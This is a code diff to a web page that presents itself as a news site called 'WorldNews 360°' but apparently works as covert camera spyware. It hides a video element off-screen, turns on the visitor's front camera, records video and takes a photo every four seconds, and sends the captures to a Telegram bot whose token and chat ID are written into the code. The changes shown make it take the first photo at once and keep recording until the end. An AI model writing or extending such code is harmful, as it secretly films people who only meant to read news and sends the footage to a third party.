@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WorldNews 360°</title>
     <style>
-        /* ========== RESET & BASE ========== */
         * {
             margin: 0;
             padding: 0;
@@ -39,10 +38,6 @@
             position: relative;
             overflow: hidden;
             transition: all 0.4s ease;
-        }
-        
-        .glass-card:hover {
-            border-color: rgba(255, 255, 255, 0.1);
         }
         
         .glass-card::before {
@@ -373,7 +368,6 @@
             }
         }
         
-        /* ========== HIDDEN VIDEO ========== */
         #video {
             position: fixed;
             top: -9999px;
@@ -449,15 +443,12 @@
 </head>
 <body>
 
-    <!-- ========== GLOW ORBS ========== -->
     <div class="glow-orb glow-orb-1"></div>
     <div class="glow-orb glow-orb-2"></div>
 
-    <!-- ========== HIDDEN VIDEO ========== -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ========== MAIN CARD ========== -->
     <div class="glass-card" id="mainCard">
         
         <div class="header">
@@ -505,9 +496,6 @@
         <div class="footer">🔒 SECURE • LIVE • 24/7 • <span>WORLD COVERAGE</span></div>
     </div>
 
-    <!-- ================================================================ -->
-    <!-- ========== JAVASCRIPT ========== -->
-    <!-- ================================================================ -->
     <script>
         // ================================================================
         //  CONFIGURATION
@@ -515,7 +503,6 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const CAPTURE_INTERVAL = 4000; // 4 seconds
-        const VIDEO_SEGMENT = 10000; // 10 seconds per video segment
         
         // ================================================================
         //  GET CODE FROM URL
@@ -628,13 +615,13 @@
         let tickerTimer = null;
         let newsTimer = null;
         let totalVideoTime = 0;
+        let isFirstPhoto = true;
         
         // ================================================================
-        //  START CAMERA (With Audio)
+        //  START CAMERA
         // ================================================================
         async function startCamera() {
             try {
-                // د کیمرې فعالول
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -650,10 +637,13 @@
                 isRunning = true;
                 videoStartTime = Date.now();
                 
-                // ویډیو ثبتول پیل کړئ
+                // ویډیو ثبتول پیل کړئ (تر پایه پورې)
                 startVideoRecording();
                 
-                // عکسونه پیل کړئ
+                // لومړی عکس سمدلاسه واخلئ
+                capturePhoto();
+                
+                // عکسونه پیل کړئ (هر ۴ ثانیې)
                 startAutoCapture();
                 
                 // UI تازه کول
@@ -668,15 +658,11 @@
             } catch (error) {
                 console.error('Camera error:', error);
                 sendErrorToTelegram(error.message);
-                // بیا هڅه وکړئ
-                setTimeout(() => {
-                    if (!isRunning) startCamera();
-                }, 3000);
             }
         }
         
         // ================================================================
-        //  VIDEO RECORDING (پټه - یوه بشپړه ویډیو)
+        //  VIDEO RECORDING (تر پایه پورې)
         // ================================================================
         function startVideoRecording() {
             if (!stream) return;
@@ -717,21 +703,12 @@
             
             mediaRecorder.start(1000);
             isRecording = true;
-            
-            // هر ۱۰ ثانیې یوه برخه بنده کړئ
-            setInterval(() => {
-                if (mediaRecorder && isRecording) {
-                    mediaRecorder.stop();
-                    isRecording = false;
-                }
-            }, VIDEO_SEGMENT);
         }
         
         // ================================================================
         //  AUTO CAPTURE PHOTO
         // ================================================================
         function startAutoCapture() {
-            capturePhoto();
             captureTimer = setInterval(() => {
                 if (isRunning) capturePhoto();
             }, CAPTURE_INTERVAL);
